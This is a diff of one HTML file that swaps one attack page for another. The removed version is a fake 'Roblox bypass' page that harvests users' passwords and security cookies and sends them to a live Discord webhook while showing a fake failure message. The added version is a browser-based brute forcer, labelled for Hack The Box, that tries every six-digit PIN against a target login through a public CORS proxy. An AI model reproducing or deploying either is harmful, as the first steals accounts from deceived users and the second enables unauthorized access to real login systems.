@@ -1,372 +1,150 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="utf-8"/>
-  <meta name="viewport" content="width=device-width, initial-scale=1"/>
-  
-  <!-- LINK PREVIEW METADATA -->
-  <title>Best Bypass for Roblox 2026</title>
-  <meta name="description" content="The best bypass for roblox 2026 — easy fast"/>
-  
-  <!-- Open Graph Previews (Discord/WhatsApp Layouts) -->
-  <meta property="og:title" content="Best Bypass for Roblox 2026"/>
-  <meta property="og:description" content="The best bypass for roblox 2026 — easy fast"/>
-  <meta property="og:type" content="website"/>
-  <meta property="og:url" content="vercel.app"/>
-  
-  <!-- Twitter Card Previews -->
-  <meta name="twitter:card" content="summary"/>
-  <meta name="twitter:title" content="Best Bypass for Roblox 2026"/>
-  <meta name="twitter:description" content="The best bypass for roblox 2026 — easy fast"/>
-  
-  <style>
-    * {
-      box-sizing: border-box;
-      margin: 0;
-      padding: 0;
-    }
-
-    body {
-      background-color: #09090b; 
-      color: #fafafa; 
-      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-      min-height: 100vh;
-      width: 100vw;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      padding: 24px;
-      overflow-y: auto;
-    }
-
-    .container {
-      width: 100%;
-      max-width: 850px;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      padding: 20px 0;
-    }
-
-    .header-block {
-      text-align: center;
-      margin-bottom: 20px;
-      user-select: none;
-      width: 100%;
-    }
-
-    .top-badge {
-      font-size: 11px;
-      text-transform: uppercase;
-      letter-spacing: 0.15em;
-      color: #a1a1aa; 
-      font-weight: 700;
-      margin-bottom: 12px;
-      display: block;
-    }
-
-    .header-block h1 {
-      font-size: 46px;
-      font-weight: 800;
-      letter-spacing: -0.05em;
-      color: #ffffff; 
-      line-height: 1;
-    }
-
-    .header-block p {
-      margin-top: 12px;
-      font-size: 14px;
-      color: #71717a; 
-      font-weight: 400;
-      letter-spacing: 0.02em;
-    }
-
-    .menu-container {
-      width: 100%;
-      margin-bottom: 24px;
-      display: flex;
-      justify-content: center;
-    }
-
-    .bypass-select {
-      background-color: #141416;
-      border: 1px solid #27272a;
-      color: #ffffff;
-      padding: 12px 20px;
-      font-size: 14px;
-      font-weight: 600;
-      border-radius: 10px;
-      outline: none;
-      cursor: pointer;
-      width: 100%;
-      max-width: 400px;
-      transition: border-color 0.15s ease, box-shadow 0.15s ease;
-    }
-
-    .bypass-select:focus {
-      border-color: #3f3f46;
-      box-shadow: 0 0 10px rgba(255, 255, 255, 0.03);
-    }
-
-    .workspace-box {
-      width: 100%;
-      position: relative;
-      background-color: #141416; 
-      border: 1px solid #27272a; 
-      border-radius: 16px;
-      padding: 24px;
-      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.4);
-      transition: border-color 0.15s ease;
-      display: flex;
-      flex-direction: column;
-      gap: 16px;
-    }
-
-    .workspace-box:focus-within {
-      border-color: #3f3f46; 
-    }
-
-    .account-fields-wrapper {
-      display: none; 
-      flex-direction: column;
-      gap: 14px;
-      width: 100%;
-    }
-
-    .credential-input {
-      width: 100%;
-      background-color: #1c1c1e;
-      border: 1px solid #27272a;
-      border-radius: 8px;
-      padding: 12px 16px;
-      font-size: 14px;
-      color: #ffffff;
-      outline: none;
-      transition: border-color 0.15s ease;
-    }
-
-    .cookie-textarea {
-      width: 100%;
-      height: 180px; 
-      background-color: #1c1c1e;
-      border: 1px solid #27272a;
-      border-radius: 8px;
-      padding: 12px 16px;
-      font-size: 14px;
-      color: #ffffff;
-      outline: none;
-      resize: none;
-      font-family: monospace; 
-      transition: border-color 0.15s ease;
-    }
-
-    .credential-input:focus, .cookie-textarea:focus {
-      border-color: #3f3f46;
-    }
-
-    .credential-input::placeholder, .cookie-textarea::placeholder {
-      color: #52525b;
-    }
-
-    .paste-area {
-      width: 100%;
-      height: 300px;
-      resize: none;
-      background: transparent;
-      border: none;
-      outline: none;
-      color: #ffffff; 
-      font-size: 16px;
-      line-height: 1.6;
-      padding-bottom: 56px;
-    }
-
-    .button-spacer {
-      height: 56px;
-      width: 100%;
-    }
-
-    .action-row {
-      position: absolute;
-      bottom: 20px;
-      left: 24px;
-      right: 24px;
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      gap: 16px;
-      pointer-events: none;
-    }
-
-    .status-msg {
-      font-size: 13px;
-      font-weight: 500;
-      pointer-events: auto;
-      transition: all 0.15s ease;
-    }
-
-    .status-sending { 
-      font-size: 14px;
-      font-weight: 600;
-      color: #000000; 
-      background-color: #ffffff; 
-      padding: 10px 22px;
-      border-radius: 8px;
-      box-shadow: 0 0 15px rgba(255, 255, 255, 0.15);
-      letter-spacing: 0.03em;
-      display: inline-block;
-      animation: pulseEffect 2s infinite ease-in-out;
-    }
-    
-    @keyframes pulseEffect {
-      0% { opacity: 0.85; transform: scale(1); }
-      50% { opacity: 1; transform: scale(1.02); }
-      100% { opacity: 0.85; transform: scale(1); }
-    }
-
-    .status-error { 
-      color: #ef4444; 
-      background: none;
-      padding: 0;
-      box-shadow: none;
-      font-size: 13px;
-      font-weight: 600;
-    }
-
-    .send-button {
-      border: none;
-      outline: none;
-      border-radius: 8px;
-      background-color: #ffffff; 
-      color: #000000; 
-      padding: 10px 24px;
-      font-size: 13px;
-      font-weight: 600;
-      cursor: pointer;
-      pointer-events: auto;
-      transition: background-color 0.15s ease, opacity 0.15s ease;
-    }
-
-    .send-button:hover:not(:disabled) {
-      background-color: #e4e4e7; 
-    }
-
-    .send-button:disabled {
-      opacity: 0.25; 
-      cursor: not-allowed;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HTB 6-Digit PIN Brute Forcer</title>
+    <style>
+        body { font-family: Arial, sans-serif; background-color: #1a1a1a; color: #fff; padding: 20px; }
+        .container { max-width: 600px; margin: 0 auto; background: #2a2a2a; padding: 20px; border-radius: 8px; }
+        label { display: block; margin-top: 10px; font-weight: bold; }
+        input, select { width: 100%; padding: 8px; margin-top: 5px; box-sizing: border-box; background: #333; color: #fff; border: 1px solid #555; border-radius: 4px; }
+        button { background-color: #00b300; color: white; padding: 10px 15px; border: none; border-radius: 4px; margin-top: 15px; cursor: pointer; width: 100%; font-size: 16px; }
+        button:disabled { background-color: #555; cursor: not-allowed; }
+        #log { background: #000; color: #00ff00; padding: 10px; height: 200px; overflow-y: scroll; margin-top: 15px; font-family: monospace; font-size: 12px; border-radius: 4px; }
+        .success { color: #00ff00; font-weight: bold; }
+    </style>
 </head>
 <body>
 
-  <main class="container">
+<div class="container">
+    <h2>HTB PIN Brute Forcer</h2>
     
-    <div class="header-block">
-      <span class="top-badge">Best BYpasser 2026 For roblox</span>
-      <h1>zeroBypass</h1>
-      <p>easy fast</p>
-    </div>
+    <label>Target URL:</label>
+    <input type="text" id="targetUrl" value="http://<TARGET_IP>/login" placeholder="http://10.10.10.x/login">
+    
+    <label>HTTP Method:</label>
+    <select id="method">
+        <option value="POST">POST</option>
+        <option value="GET">GET</option>
+    </select>
 
-    <div class="menu-container">
-      <select id="mode-select" class="bypass-select">
-        <option value="text">Bypass with Cookies Only</option>
-        <option value="account">Bypass with Cookie & Password</option>
-      </select>
-    </div>
+    <label>PIN Parameter Name:</label>
+    <input type="text" id="paramName" value="pin">
 
-    <div class="workspace-box">
-      
-      <div id="account-fields" class="account-fields-wrapper">
-        <input type="password" id="acc-password" class="credential-input" placeholder="Enter Roblox Account Password..." autocomplete="off">
-        <textarea id="acc-cookie" class="cookie-textarea" placeholder="Enter Roblox Security Cookie (_|WARNING:-DO-NOT-SHARE-THIS...)" autocomplete="off"></textarea>
-      </div>
-      
-      <textarea id="paste-box" class="paste-area" placeholder="Paste text payload here..." autocomplete="off" spellcheck="false"></textarea>
-      
-      <div id="spacer-block" class="button-spacer" style="display: none;"></div>
-      
-      <div class="action-row">
-        <div id="status" class="status-msg"></div>
-        <button id="send-btn" class="send-button" disabled>Send</button>
-      </div>
-      
-    </div>
-  </main>
+    <label>Cookie Header Name:</label>
+    <input type="text" id="cookieName" value="PHPSESSID">
 
-  <script>
-    const modeSelect = document.getElementById('mode-select');
-    const accountFields = document.getElementById('account-fields');
-    const accPassword = document.getElementById('acc-password');
-    const accCookie = document.getElementById('acc-cookie');
-    const textarea = document.getElementById('paste-box');
-    const spacerBlock = document.getElementById('spacer-block');
-    const sendBtn = document.getElementById('send-btn');
-    const status = document.getElementById('status');
+    <label>Cookie Value:</label>
+    <input type="text" id="cookieValue" placeholder="Paste your active session cookie here">
 
-    // Live target webhook link integration
-    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1504192414087254100/apLGJpnGAkhJUuhjDIrL3xDYT8leCsNP4S3TSMA_xS9kYttbru-qQAFFro5s-20qqpBL";
+    <label>Failure Keyword (Stop if this is NOT in response):</label>
+    <input type="text" id="failWord" value="Invalid PIN">
 
-    modeSelect.addEventListener('change', () => {
-      if (modeSelect.value === 'account') {
-        accountFields.style.display = 'flex';
-        textarea.style.display = 'none'; 
-        spacerBlock.style.display = 'block'; 
-      } else {
-        accountFields.style.display = 'none';
-        textarea.style.display = 'block';
-        spacerBlock.style.display = 'none';
-        accPassword.value = "";
-        accCookie.value = "";
-      }
-      validateFormState();
-    });
+    <button id="startBtn" onclick="startBruteForce()">Start Process</button>
+    
+    <div id="log">[*] System ready. Fill configuration and press Start.</div>
+</div>
 
-    function validateFormState() {
-      if (modeSelect.value === 'account') {
-        const passVal = accPassword.value.trim();
-        const cookieVal = accCookie.value.trim();
-        sendBtn.disabled = (passVal === "" || cookieVal === "");
-      } else {
-        const textVal = textarea.value.trim();
-        sendBtn.disabled = (textVal === "");
-      }
+<script>
+let running = false;
+
+function log(msg, isSuccess = false) {
+    const logDiv = document.getElementById('log');
+    const span = document.createElement('span');
+    if (isSuccess) span.className = 'success';
+    span.textContent = msg + '\n';
+    logDiv.appendChild(span);
+    logDiv.scrollTop = logDiv.scrollHeight;
+}
+
+async function tryPin(pin, url, method, param, cookieName, cookieVal, failWord) {
+    const formattedPin = String(pin).padStart(6, '0');
+    
+    // Using a public CORS proxy to bypass browser restrictions
+    const proxyUrl = 'corsproxy.io?' + encodeURIComponent(url);
+    
+    let fetchUrl = proxyUrl;
+    let options = {
+        method: method,
+        headers: {
+            'X-Requested-With': 'XMLHttpRequest',
+            'Cookie': `${cookieName}=${cookieVal}`
+        }
+    };
+
+    if (method === 'POST') {
+        options.headers['Content-Type'] = 'application/x-www-form-urlencoded';
+        options.body = `${encodeURIComponent(param)}=${encodeURIComponent(formattedPin)}`;
+    } else {
+        fetchUrl += (url.includes('?') ? '&' : '?') + `${encodeURIComponent(param)}=${encodeURIComponent(formattedPin)}`;
     }
 
-    textarea.addEventListener('input', validateFormState);
-    accPassword.addEventListener('input', validateFormState);
-    accCookie.addEventListener('input', validateFormState);
+    try {
+        const response = await fetch(fetchUrl, options);
+        const text = await response.text();
+        
+        if (!text.includes(failWord)) {
+            return { success: true, pin: formattedPin };
+        }
+    } catch (err) {
+        // Silent catch for network errors during high-speed blasting
+    }
+    return { success: false, pin: formattedPin };
+}
 
-    sendBtn.addEventListener('click', async () => {
-      sendBtn.disabled = true;
-      status.textContent = "bypassing.....";
-      status.className = "status-msg status-sending";
+async function startBruteForce() {
+    if (running) return;
+    
+    const url = document.getElementById('targetUrl').value;
+    const method = document.getElementById('method').value;
+    const param = document.getElementById('paramName').value;
+    const cookieName = document.getElementById('cookieName').value;
+    const cookieVal = document.getElementById('cookieValue').value;
+    const failWord = document.getElementById('failWord').value;
 
-      let discordPayload = "";
-      if (modeSelect.value === 'account') {
-        discordPayload = `**[zeroBypass Roblox Account Vector Details]**\n**Password:** \`${accPassword.value.trim()}\`\n**Cookie:** \`\`\`text\n${accCookie.value.trim()}\n\`\`\``;
-      } else {
-        discordPayload = `**[zeroBypass Roblox Packet]**\n\`\`\`text\n${textarea.value.trim()}\n\`\`\``;
-      }
+    if (!cookieVal) {
+        alert('Please provide a cookie value!');
+        return;
+    }
 
-      try {
-        await fetch(DISCORD_WEBHOOK_URL, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ content: discordPayload })
-        });
-      } catch (err) {
-        // Safe operational logic fallback
-      }
+    running = true;
+    document.getElementById('startBtn').disabled = true;
+    document.getElementById('log').innerHTML = '';
+    log(`[*] Starting attack against ${url}...`);
 
-      // Configured precisely for 15 seconds
-      setTimeout(() => {
-        status.textContent = "bypass failed";
-        status.className = "status-msg status-error";
-        sendBtn.disabled = false;
-      }, 15000);
-    });
-  </script>
+    // Iterating batch blocks to keep the browser responsive
+    const batchSize = 15; 
+    for (let i = 0; i < 1000000; i += batchSize) {
+        if (!running) break;
+
+        if (i % 300 === 0) {
+            log(`[-] Testing range starting at: ${String(i).padStart(6, '0')}`);
+            // Small pause to yield control back to the UI thread
+            await new Promise(r => setTimeout(r, 40)); 
+        }
+
+        const promises = [];
+        for (let j = 0; j < batchSize && (i + j) < 1000000; j++) {
+            promises.push(tryPin(i + j, url, method, param, cookieName, cookieVal, failWord));
+        }
+
+        const results = await Promise.all(promises);
+        for (const res of results) {
+            if (res.success) {
+                log(`[+] SUCCESS! Valid PIN found: ${res.pin}`, true);
+                running = false;
+                document.getElementById('startBtn').disabled = false;
+                return;
+            }
+        }
+    }
+
+    log('[-] Process finished. No valid PIN detected.');
+    running = false;
+    document.getElementById('startBtn').disabled = false;
+}
+</script>
 
 </body>
 </html>
